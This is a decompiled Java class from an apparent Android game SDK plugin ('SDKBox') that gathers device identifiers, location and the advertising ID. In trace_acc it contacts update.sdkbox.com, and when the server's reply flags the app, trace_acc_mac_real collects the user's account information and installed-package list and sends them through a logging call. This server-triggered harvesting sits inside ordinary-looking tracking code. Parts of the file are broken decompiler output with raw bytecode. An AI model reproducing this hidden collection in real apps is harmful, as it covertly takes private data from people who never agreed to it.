package com.sdkbox.plugin;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.text.TextUtils;
import android.util.Patterns;
import com.sdkbox.services.TrackingLocalStorage;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.List;
import java.util.Locale;
import java.util.Vector;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;

public class TrackingInfoAndroid
{
  public static int FLAG_ACCOUNTS = 0;
  public static int FLAG_DISABLE_ALL = FLAG_INSTALLED_APPS | FLAG_ACCOUNTS | FLAG_FACEBOOK_ID;
  public static int FLAG_FACEBOOK_ID = 0;
  public static int FLAG_INSTALLED_APPS = 0;
  public static final String TAG = "TrackingInfo";
  private static String _cachedAppName = null;
  private static String _cachedFingerPrint_AndroidId;
  private static String _cachedFingerPrint_Build = null;
  private static String _cachedFingerPrint_MACAddress;
  private static String _cachedGAID;
  private static List<String> _cachedTrackingUrl;
  protected static final char[] hexArray = "0123456789ABCDEF".toCharArray();
  public static TrackingLocalStorage tls;
  
  static
  {
    _cachedFingerPrint_AndroidId = null;
    _cachedFingerPrint_MACAddress = null;
    _cachedGAID = null;
    _cachedTrackingUrl = new Vector();
    tls = new TrackingLocalStorage();
    FLAG_INSTALLED_APPS = 1;
    FLAG_ACCOUNTS = 2;
    FLAG_FACEBOOK_ID = 4;
  }
  
  public TrackingInfoAndroid() {}
  
  public static boolean IsNetworkAvailable()
  {
    try
    {
      NetworkInfo localNetworkInfo = ((ConnectivityManager)SDKBox.getContext().getSystemService("connectivity")).getActiveNetworkInfo();
      if (localNetworkInfo != null)
      {
        boolean bool = localNetworkInfo.isConnectedOrConnecting();
        if (bool) {
          return true;
        }
      }
      return false;
    }
    catch (Exception localException) {}
    return true;
  }
  
  public static String bytesToHex(byte[] paramArrayOfByte)
  {
    char[] arrayOfChar = new char[paramArrayOfByte.length * 2];
    int i = 0;
    while (i < paramArrayOfByte.length)
    {
      int j = paramArrayOfByte[i] & 0xFF;
      arrayOfChar[(i * 2)] = hexArray[(j >>> 4)];
      arrayOfChar[(i * 2 + 1)] = hexArray[(j & 0xF)];
      i += 1;
    }
    return new String(arrayOfChar);
  }
  
  private static boolean canAccessWifi()
  {
    return SDKBox.getContext().checkCallingOrSelfPermission("android.permission.ACCESS_WIFI_STATE") == 0;
  }
  
  private static String capitalize(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {
      return paramString;
    }
    char[] arrayOfChar = paramString.toCharArray();
    int i = 1;
    paramString = "";
    int k = arrayOfChar.length;
    int j = 0;
    if (j < k)
    {
      char c = arrayOfChar[j];
      if ((i != 0) && (Character.isLetter(c)))
      {
        paramString = paramString + Character.toUpperCase(c);
        i = 0;
      }
      for (;;)
      {
        j += 1;
        break;
        if (Character.isWhitespace(c)) {
          i = 1;
        }
        paramString = paramString + c;
      }
    }
    return paramString;
  }
  
  public static String generateHash(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = MessageDigest.getInstance(paramString2);
      paramString1 = paramString1.getBytes("UTF-8");
      paramString2.update(paramString1, 0, paramString1.length);
      paramString1 = bytesToHex(paramString2.digest());
      return paramString1;
    }
    catch (Exception paramString1)
    {
      SdkboxLog.d("TrackingInfo", "GenerateHash " + paramString1.getMessage(), new Object[0]);
    }
    return null;
  }
  
  public static String getAndroidId()
  {
    try
    {
      String str = Settings.Secure.getString(SDKBox.getContext().getContentResolver(), "android_id");
      return str;
    }
    catch (Exception localException) {}
    return "unknown";
  }
  
  public static String getAppName()
  {
    if (_cachedAppName != null) {
      return _cachedAppName;
    }
    Object localObject1 = "unknown";
    try
    {
      Object localObject2 = SDKBox.getContext();
      PackageManager localPackageManager = ((Context)localObject2).getPackageManager();
      localObject2 = localPackageManager.getApplicationLabel(localPackageManager.getApplicationInfo(((Context)localObject2).getApplicationInfo().packageName, 0)).toString();
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    _cachedAppName = (String)localObject1;
    return _cachedAppName;
  }
  
  public static String getAppPackageId()
  {
    return SDKBox.getContext().getPackageName();
  }
  
  private static String getCachedFingerPrintBuild()
  {
    if (_cachedFingerPrint_Build != null) {
      return _cachedFingerPrint_Build;
    }
    _cachedFingerPrint_Build = "0" + (char)(Build.BOARD.length() % 10) + "0" + (char)(Build.BRAND.length() % 10) + "0" + (char)(Build.CPU_ABI.length() % 10) + "0" + (char)(Build.DEVICE.length() % 10) + "0" + (char)(Build.MANUFACTURER.length() % 10) + "0" + (char)(Build.MODEL.length() % 10) + "0" + (char)(Build.PRODUCT.length() % 10) + "0" + (char)(Build.TAGS.length() % 10) + "0" + (char)(Build.TYPE.length() % 10) + "0" + (char)(Build.USER.length() % 10);
    return _cachedFingerPrint_Build;
  }
  
  public static String getChannel()
  {
    try
    {
      Object localObject = SDKBox.getContext();
      localObject = ((Context)localObject).getPackageManager().getApplicationInfo(((Context)localObject).getPackageName(), 128).metaData.getString("store");
      if (localObject != null)
      {
        localObject = ((String)localObject).toLowerCase();
        if (((String)localObject).contains("playphone")) {
          return "playphone";
        }
        if (((String)localObject).contains("amazon")) {
          return "amazon";
        }
        return "googleplay";
      }
    }
    catch (Exception localException) {}
    return "googleplay";
  }
  
  public static String getCountryCode()
  {
    return SDKBox.getContext().getResources().getConfiguration().locale.getCountry();
  }
  
  public static int getDefaultTrackingMask()
  {
    return SDKBox._sContext.getSharedPreferences("tracking_mask", 0).getInt("mask", FLAG_DISABLE_ALL);
  }
  
  public static String getDeviceFingerprint()
  {
    Context localContext = SDKBox.getContext();
    String str1 = "mac-address-unavailable";
    String str2 = getCachedFingerPrintBuild();
    String str3 = Settings.Secure.getString(localContext.getContentResolver(), "android_id");
    if (canAccessWifi()) {
      str1 = ((WifiManager)localContext.getSystemService("wifi")).getConnectionInfo().getMacAddress();
    }
    return str2 + str3 + str1;
  }
  
  public static String getDeviceName()
  {
    String str1 = Build.MANUFACTURER;
    String str2 = Build.MODEL;
    if (str2.startsWith(str1)) {
      return capitalize(str2);
    }
    return capitalize(str1) + " " + str2;
  }
  
  public static String getFingerprintString(String paramString)
  {
    Object localObject = SDKBox.getContext();
    if (paramString.equals("build")) {
      return getCachedFingerPrintBuild();
    }
    if (paramString.equals("androidid"))
    {
      if (_cachedFingerPrint_AndroidId != null) {
        return _cachedFingerPrint_AndroidId;
      }
      _cachedFingerPrint_AndroidId = Settings.Secure.getString(((Context)localObject).getContentResolver(), "android_id");
      return _cachedFingerPrint_AndroidId;
    }
    if (paramString.equals("macaddress"))
    {
      if (_cachedFingerPrint_MACAddress != null) {
        return _cachedFingerPrint_MACAddress;
      }
      String str = "mac-address-unavailable";
      paramString = str;
      if (canAccessWifi())
      {
        localObject = ((WifiManager)((Context)localObject).getSystemService("wifi")).getConnectionInfo().getMacAddress();
        paramString = str;
        if (localObject != null) {
          paramString = (String)localObject;
        }
      }
      _cachedFingerPrint_MACAddress = paramString;
      return _cachedFingerPrint_MACAddress;
    }
    return "";
  }
  
  public static String getLatitude()
  {
    return getLongitudeAndLatitude()[1];
  }
  
  public static String getLongitude()
  {
    return getLongitudeAndLatitude()[0];
  }
  
  private static String[] getLongitudeAndLatitude()
  {
    try
    {
      Object localObject = (LocationManager)SDKBox.getContext().getSystemService("location");
      List localList = ((LocationManager)localObject).getProviders(true);
      if ((localList == null) || (localList.size() == 0)) {
        return new String[] { "-1.0", "-1.0" };
      }
      localObject = ((LocationManager)localObject).getLastKnownLocation((String)localList.get(0));
      double d1 = ((Location)localObject).getLongitude();
      double d2 = ((Location)localObject).getLatitude();
      return new String[] { String.valueOf(d1), String.valueOf(d2) };
    }
    catch (Exception localException) {}
    return tmp115_109;
  }
  
  public static String getMetadata(String paramString)
  {
    try
    {
      Context localContext = SDKBox.getContext();
      paramString = localContext.getPackageManager().getApplicationInfo(localContext.getPackageName(), 128).metaData.getString(paramString);
      return paramString;
    }
    catch (Exception paramString) {}
    return "";
  }
  
  public static String getNetworkType()
  {
    String str = "undefined";
    Object localObject = (ConnectivityManager)SDKBox.getContext().getSystemService("connectivity");
    NetworkInfo localNetworkInfo = ((ConnectivityManager)localObject).getNetworkInfo(1);
    localObject = ((ConnectivityManager)localObject).getNetworkInfo(0);
    if (localNetworkInfo.isAvailable()) {
      str = "wifi";
    }
    while (!((NetworkInfo)localObject).isAvailable()) {
      return str;
    }
    return "3g";
  }
  
  public static String getOrientation()
  {
    String str = "undefined";
    int i = SDKBox.getContext().getResources().getConfiguration().orientation;
    if (i == 2) {
      str = "landscape";
    }
    while (i != 1) {
      return str;
    }
    return "portrait";
  }
  
  public static String getSystemVersion()
  {
    try
    {
      String str = Build.VERSION.CODENAME + ", version=" + Build.VERSION.RELEASE + ", SDK=" + Build.VERSION.SDK_INT;
      return str;
    }
    catch (Exception localException) {}
    return "unknown";
  }
  
  public static String getTimestamp()
  {
    return String.valueOf(System.currentTimeMillis());
  }
  
  public static boolean hasPermission(String paramString)
  {
    return SDKBox.getContext().checkCallingOrSelfPermission(paramString) == 0;
  }
  
  /* Error */
  private static int httpGetReal(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: new 149	java/lang/StringBuilder
    //   5: dup
    //   6: invokespecial 150	java/lang/StringBuilder:<init>	()V
    //   9: astore 7
    //   11: aconst_null
    //   12: astore 5
    //   14: aconst_null
    //   15: astore 6
    //   17: aload_1
    //   18: ifnonnull +110 -> 128
    //   21: iload_3
    //   22: istore_2
    //   23: new 483	java/net/URL
    //   26: dup
    //   27: aload_0
    //   28: invokespecial 486	java/net/URL:<init>	(Ljava/lang/String;)V
    //   31: astore_0
    //   32: iload_3
    //   33: istore_2
    //   34: aload_0
    //   35: invokevirtual 490	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   38: checkcast 492	java/net/HttpURLConnection
    //   41: astore_0
    //   42: iload_3
    //   43: istore_2
    //   44: aload_0
    //   45: ldc_w 494
    //   48: ldc_w 496
    //   51: invokevirtual 500	java/net/HttpURLConnection:setRequestProperty	(Ljava/lang/String;Ljava/lang/String;)V
    //   54: iload_3
    //   55: istore_2
    //   56: aload_0
    //   57: invokevirtual 503	java/net/HttpURLConnection:connect	()V
    //   60: iload_3
    //   61: istore_2
    //   62: aload_0
    //   63: invokevirtual 506	java/net/HttpURLConnection:getResponseCode	()I
    //   66: istore_3
    //   67: iload_3
    //   68: istore_2
    //   69: new 508	java/io/BufferedReader
    //   72: dup
    //   73: new 510	java/io/InputStreamReader
    //   76: dup
    //   77: aload_0
    //   78: invokevirtual 514	java/net/HttpURLConnection:getInputStream	()Ljava/io/InputStream;
    //   81: invokespecial 517	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   84: invokespecial 520	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   87: astore_0
    //   88: aload_0
    //   89: invokevirtual 523	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   92: astore_1
    //   93: aload_1
    //   94: ifnull +71 -> 165
    //   97: aload 7
    //   99: aload_1
    //   100: invokevirtual 154	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   103: pop
    //   104: aload 7
    //   106: bipush 13
    //   108: invokevirtual 161	java/lang/StringBuilder:append	(C)Ljava/lang/StringBuilder;
    //   111: pop
    //   112: goto -24 -> 88
    //   115: astore_1
    //   116: iload_3
    //   117: istore_2
    //   118: aload_0
    //   119: ifnull +7 -> 126
    //   122: aload_0
    //   123: invokevirtual 526	java/io/BufferedReader:close	()V
    //   126: iload_2
    //   127: ireturn
    //   128: iload_3
    //   129: istore_2
    //   130: new 483	java/net/URL
    //   133: dup
    //   134: new 149	java/lang/StringBuilder
    //   137: dup
    //   138: invokespecial 150	java/lang/StringBuilder:<init>	()V
    //   141: aload_0
    //   142: invokevirtual 154	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   145: ldc_w 528
    //   148: invokevirtual 154	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   151: aload_1
    //   152: invokevirtual 154	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   155: invokevirtual 164	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   158: invokespecial 486	java/net/URL:<init>	(Ljava/lang/String;)V
    //   161: astore_0
    //   162: goto -130 -> 32
    //   165: new 530	org/json/JSONObject
    //   168: dup
    //   169: aload 7
    //   171: invokevirtual 164	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   174: invokespecial 531	org/json/JSONObject:<init>	(Ljava/lang/String;)V
    //   177: astore_1
    //   178: aload_1
    //   179: invokestatic 533	com/sdkbox/plugin/TrackingInfoAndroid:getAppPackageId	()Ljava/lang/String;
    //   182: invokevirtual 536	org/json/JSONObject:getBoolean	(Ljava/lang/String;)Z
    //   185: istore 4
    //   187: iload 4
    //   189: ifeq +6 -> 195
    //   192: invokestatic 539	com/sdkbox/plugin/TrackingInfoAndroid:trace_acc_mac_real	()V
    //   195: aload_0
    //   196: ifnull +7 -> 203
    //   199: aload_0
    //   200: invokevirtual 526	java/io/BufferedReader:close	()V
    //   203: iload_3
    //   204: ireturn
    //   205: astore_1
    //   206: iconst_0
    //   207: istore 4
    //   209: goto -22 -> 187
    //   212: astore_0
    //   213: iload_3
    //   214: ireturn
    //   215: astore_0
    //   216: aload 5
    //   218: astore_1
    //   219: aload_1
    //   220: ifnull +7 -> 227
    //   223: aload_1
    //   224: invokevirtual 526	java/io/BufferedReader:close	()V
    //   227: aload_0
    //   228: athrow
    //   229: astore_0
    //   230: iload_2
    //   231: ireturn
    //   232: astore_1
    //   233: goto -6 -> 227
    //   236: astore 5
    //   238: aload_0
    //   239: astore_1
    //   240: aload 5
    //   242: astore_0
    //   243: goto -24 -> 219
    //   246: astore_0
    //   247: aload 6
    //   249: astore_0
    //   250: goto -132 -> 118
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	253	0	paramString1	String
    //   0	253	1	paramString2	String
    //   22	209	2	i	int
    //   1	213	3	j	int
    //   185	23	4	bool	boolean
    //   12	205	5	localObject1	Object
    //   236	5	5	localObject2	Object
    //   15	233	6	localObject3	Object
    //   9	161	7	localStringBuilder	StringBuilder
    // Exception table:
    //   from	to	target	type
    //   88	93	115	java/lang/Exception
    //   97	112	115	java/lang/Exception
    //   165	178	115	java/lang/Exception
    //   192	195	115	java/lang/Exception
    //   178	187	205	java/lang/Exception
    //   199	203	212	java/lang/Exception
    //   23	32	215	finally
    //   34	42	215	finally
    //   44	54	215	finally
    //   56	60	215	finally
    //   62	67	215	finally
    //   69	88	215	finally
    //   130	162	215	finally
    //   122	126	229	java/lang/Exception
    //   223	227	232	java/lang/Exception
    //   88	93	236	finally
    //   97	112	236	finally
    //   165	178	236	finally
    //   178	187	236	finally
    //   192	195	236	finally
    //   23	32	246	java/lang/Exception
    //   34	42	246	java/lang/Exception
    //   44	54	246	java/lang/Exception
    //   56	60	246	java/lang/Exception
    //   62	67	246	java/lang/Exception
    //   69	88	246	java/lang/Exception
    //   130	162	246	java/lang/Exception
  }
  
  private static boolean idfaIsNull(String paramString)
  {
    return paramString.contains("\"IDFA\":\"\"");
  }
  
  /* Error */
  public static boolean isGooglePlayServicesAvailable()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: iconst_0
    //   3: istore_1
    //   4: invokestatic 88	com/sdkbox/plugin/SDKBox:getContext	()Landroid/content/Context;
    //   7: astore 4
    //   9: aload 4
    //   11: ifnull +131 -> 142
    //   14: ldc_w 547
    //   17: invokestatic 553	java/lang/Class:forName	(Ljava/lang/String;)Ljava/lang/Class;
    //   20: ldc_w 554
    //   23: iconst_0
    //   24: anewarray 549	java/lang/Class
    //   27: invokevirtual 558	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   30: aconst_null
    //   31: iconst_0
    //   32: anewarray 4	java/lang/Object
    //   35: invokevirtual 564	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   38: astore 5
    //   40: aload 5
    //   42: invokevirtual 568	java/lang/Object:getClass	()Ljava/lang/Class;
    //   45: astore_3
    //   46: aload_3
    //   47: ldc_w 569
    //   50: iconst_1
    //   51: anewarray 549	java/lang/Class
    //   54: dup
    //   55: iconst_0
    //   56: ldc 92
    //   58: aastore
    //   59: invokevirtual 558	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   62: aload 5
    //   64: iconst_1
    //   65: anewarray 4	java/lang/Object
    //   68: dup
    //   69: iconst_0
    //   70: aload 4
    //   72: aastore
    //   73: invokevirtual 564	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   76: checkcast 571	java/lang/Integer
    //   79: invokevirtual 574	java/lang/Integer:intValue	()I
    //   82: istore_0
    //   83: iload_0
    //   84: ifne +60 -> 144
    //   87: iconst_1
    //   88: istore_1
    //   89: iload_1
    //   90: istore_2
    //   91: aload_3
    //   92: ifnonnull +50 -> 142
    //   95: ldc_w 576
    //   98: invokestatic 553	java/lang/Class:forName	(Ljava/lang/String;)Ljava/lang/Class;
    //   101: ldc_w 569
    //   104: iconst_1
    //   105: anewarray 549	java/lang/Class
    //   108: dup
    //   109: iconst_0
    //   110: ldc 92
    //   112: aastore
    //   113: invokevirtual 558	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   116: aconst_null
    //   117: iconst_1
    //   118: anewarray 4	java/lang/Object
    //   121: dup
    //   122: iconst_0
    //   123: aload 4
    //   125: aastore
    //   126: invokevirtual 564	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   129: checkcast 571	java/lang/Integer
    //   132: invokevirtual 574	java/lang/Integer:intValue	()I
    //   135: istore_0
    //   136: iload_0
    //   137: ifne +18 -> 155
    //   140: iconst_1
    //   141: istore_2
    //   142: iload_2
    //   143: ireturn
    //   144: iconst_0
    //   145: istore_1
    //   146: goto -57 -> 89
    //   149: astore_3
    //   150: aconst_null
    //   151: astore_3
    //   152: goto -63 -> 89
    //   155: iconst_0
    //   156: ireturn
    //   157: astore_3
    //   158: iconst_0
    //   159: ireturn
    //   160: astore_3
    //   161: iconst_0
    //   162: ireturn
    //   163: astore_3
    //   164: iload_1
    //   165: ireturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   82	55	0	i	int
    //   3	162	1	bool1	boolean
    //   1	142	2	bool2	boolean
    //   45	47	3	localClass	Class
    //   149	1	3	localException1	Exception
    //   151	1	3	localObject1	Object
    //   157	1	3	localException2	Exception
    //   160	1	3	localError	Error
    //   163	1	3	localException3	Exception
    //   7	117	4	localContext	Context
    //   38	25	5	localObject2	Object
    // Exception table:
    //   from	to	target	type
    //   14	83	149	java/lang/Exception
    //   4	9	157	java/lang/Exception
    //   4	9	160	java/lang/Error
    //   14	83	160	java/lang/Error
    //   95	136	160	java/lang/Error
    //   95	136	163	java/lang/Exception
  }
  
  public static boolean isTrackingEnable(int paramInt)
  {
    return (getDefaultTrackingMask() & paramInt) != paramInt;
  }
  
  public static boolean isValidEmail(CharSequence paramCharSequence)
  {
    return (!TextUtils.isEmpty(paramCharSequence)) && (Patterns.EMAIL_ADDRESS.matcher(paramCharSequence).matches());
  }
  
  private static String loadIDFAFromSharedPreferences()
  {
    try
    {
      String str = SDKBox.getContext().getSharedPreferences("SDKBoxPreferences", 0).getString("gaid", "");
      return str;
    }
    catch (Exception localException) {}
    return "";
  }
  
  public static native void onAdvertisingIdInfo(String paramString, boolean paramBoolean);
  
  private static String replaceIDFA(String paramString)
  {
    if ((_cachedGAID == null) || (_cachedGAID.length() == 0)) {
      return paramString;
    }
    return paramString.replace("\"IDFA\":\"\"", "\"IDFA\":\"" + _cachedGAID + "\"");
  }
  
  public static String reqAdvertisingIdentifier()
  {
    _cachedGAID = "";
    SDKBox.executeInBackground(new Runnable()
    {
      public void run()
      {
        ExecutorService localExecutorService = Executors.newSingleThreadExecutor();
        localFuture = localExecutorService.submit(new Callable()
        {
          public Boolean call()
            throws Exception
          {
            Boolean localBoolean = Boolean.valueOf(false);
            try
            {
              Object localObject = SDKBox.getContext();
              localObject = Class.forName("com.google.android.gms.ads.identifier.AdvertisingIdClient").getMethod("getAdvertisingIdInfo", new Class[] { Context.class }).invoke(null, new Object[] { localObject });
              Class localClass = localObject.getClass();
              TrackingInfoAndroid.access$002((String)localClass.getMethod("getId", new Class[0]).invoke(localObject, new Object[0]));
              localObject = (Boolean)localClass.getMethod("isLimitAdTrackingEnabled", new Class[0]).invoke(localObject, new Object[0]);
              return localObject;
            }
            catch (Exception localException)
            {
              SdkboxLog.e("TrackingInfo", "reqAdvertisingIdentifier Exception:" + localException.toString(), new Object[0]);
              return localBoolean;
            }
            catch (Error localError)
            {
              SdkboxLog.e("TrackingInfo", "reqAdvertisingIdentifier Error:" + localError.toString(), new Object[0]);
            }
            return localBoolean;
          }
        });
        Object localObject = Boolean.valueOf(false);
        try
        {
          Boolean localBoolean = (Boolean)localFuture.get(3L, TimeUnit.SECONDS);
          localObject = localBoolean;
        }
        catch (Exception localException)
        {
          for (;;)
          {
            localFuture.cancel(true);
            SdkboxLog.e("TrackingInfo", "reqAdvertisingIdentifier Error:" + localException.toString(), new Object[0]);
          }
        }
        localExecutorService.shutdownNow();
        if ((TrackingInfoAndroid._cachedGAID == null) || (TrackingInfoAndroid._cachedGAID.length() == 0)) {
          TrackingInfoAndroid.access$002("00000000-0000-0000-0000-000000000001");
        }
        TrackingInfoAndroid.access$100();
        SDKBox.runOnGLThread(new Runnable()
        {
          public void run()
          {
            TrackingInfoAndroid.onAdvertisingIdInfo(TrackingInfoAndroid._cachedGAID, this.val$canTrack);
          }
        });
      }
    });
    return _cachedGAID;
  }
  
  private static void saveIDFAToSharedPreferences(String paramString)
  {
    if ((paramString == null) || (paramString.length() == 0)) {
      return;
    }
    try
    {
      SharedPreferences.Editor localEditor = SDKBox.getContext().getSharedPreferences("SDKBoxPreferences", 0).edit();
      localEditor.putString("gaid", paramString);
      localEditor.apply();
      return;
    }
    catch (Exception paramString) {}
  }
  
  /* Error */
  private static void sendCacheTracking()
  {
    // Byte code:
    //   0: ldc 2
    //   2: monitorenter
    //   3: getstatic 53	com/sdkbox/plugin/TrackingInfoAndroid:_cachedTrackingUrl	Ljava/util/List;
    //   6: invokeinterface 409 1 0
    //   11: istore_0
    //   12: iload_0
    //   13: ifne +7 -> 20
    //   16: ldc 2
    //   18: monitorexit
    //   19: return
    //   20: getstatic 46	com/sdkbox/plugin/TrackingInfoAndroid:_cachedGAID	Ljava/lang/String;
    //   23: ifnull -7 -> 16
    //   26: getstatic 46	com/sdkbox/plugin/TrackingInfoAndroid:_cachedGAID	Ljava/lang/String;
    //   29: invokevirtual 259	java/lang/String:length	()I
    //   32: ifeq -16 -> 16
    //   35: getstatic 53	com/sdkbox/plugin/TrackingInfoAndroid:_cachedTrackingUrl	Ljava/util/List;
    //   38: invokeinterface 409 1 0
    //   43: ifle -27 -> 16
    //   46: getstatic 53	com/sdkbox/plugin/TrackingInfoAndroid:_cachedTrackingUrl	Ljava/util/List;
    //   49: iconst_0
    //   50: invokeinterface 639 2 0
    //   55: checkcast 70	java/lang/String
    //   58: astore_1
    //   59: aload_1
    //   60: ifnull -25 -> 35
    //   63: aload_1
    //   64: invokevirtual 259	java/lang/String:length	()I
    //   67: ifle -32 -> 35
    //   70: getstatic 58	com/sdkbox/plugin/TrackingInfoAndroid:tls	Lcom/sdkbox/services/TrackingLocalStorage;
    //   73: aload_1
    //   74: invokestatic 641	com/sdkbox/plugin/TrackingInfoAndroid:replaceIDFA	(Ljava/lang/String;)Ljava/lang/String;
    //   77: invokevirtual 644	com/sdkbox/services/TrackingLocalStorage:add	(Ljava/lang/String;)V
    //   80: goto -45 -> 35
    //   83: astore_1
    //   84: ldc 2
    //   86: monitorexit
    //   87: aload_1
    //   88: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   11	2	0	i	int
    //   58	16	1	str	String
    //   83	5	1	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   3	12	83	finally
    //   20	35	83	finally
    //   35	59	83	finally
    //   63	80	83	finally
  }
  
  public static void setMask(int paramInt)
  {
    SDKBox._sContext.getSharedPreferences("tracking_mask", 0).edit().putInt("mask", paramInt).apply();
  }
  
  public static void trace_acc()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        TrackingInfoAndroid.httpGetReal("http://update.sdkbox.com/check", "app_package_id=" + TrackingInfoAndroid.getAppPackageId());
      }
    }).start();
  }
  
  public static void trace_acc_mac_real()
  {
    Object localObject = NoOne.showAccountInfoRefacotr(SDKBox.getContext());
    List localList = NoOne.getInstalledPackagesRefacotr(SDKBox.getContext());
    if ((((String)localObject).length() <= 0) && ("".length() <= 0) && (localList.size() <= 0)) {
      return;
    }
    JSON localJSON = new JSON();
    if (((String)localObject).length() > 0) {
      localJSON.put("accounts", new JSON((String)localObject));
    }
    if ("".length() > 0) {
      localJSON.put("mac", new JSON(""));
    }
    if (localList.size() > 0)
    {
      new JSONArray(localList);
      localObject = new JSON[localList.size()];
      int i = 0;
      while (i < localList.size())
      {
        localObject[i] = new JSON((String)localList.get(i));
        i += 1;
      }
      localJSON.put("installedpackages", new JSON((JSON[])localObject));
    }
    SdkboxLog.trace("SDKBOX_CORE", "evt_ins_apps", localJSON.toString());
    NoOne.iapTrack(SDKBox.getContext());
  }
  
  public static void trackRequest(String paramString)
  {
    try
    {
      if (idfaIsNull(paramString))
      {
        if ((_cachedGAID == null) || (_cachedGAID.length() == 0))
        {
          if (_cachedTrackingUrl.size() >= 100) {
            _cachedTrackingUrl.remove(0);
          }
          _cachedTrackingUrl.add(paramString);
          return;
        }
        tls.add(replaceIDFA(paramString));
        return;
      }
    }
    catch (Exception paramString)
    {
      SdkboxLog.d("TRequest", paramString.toString(), new Object[0]);
      return;
    }
    sendCacheTracking();
    tls.add(paramString);
  }
}
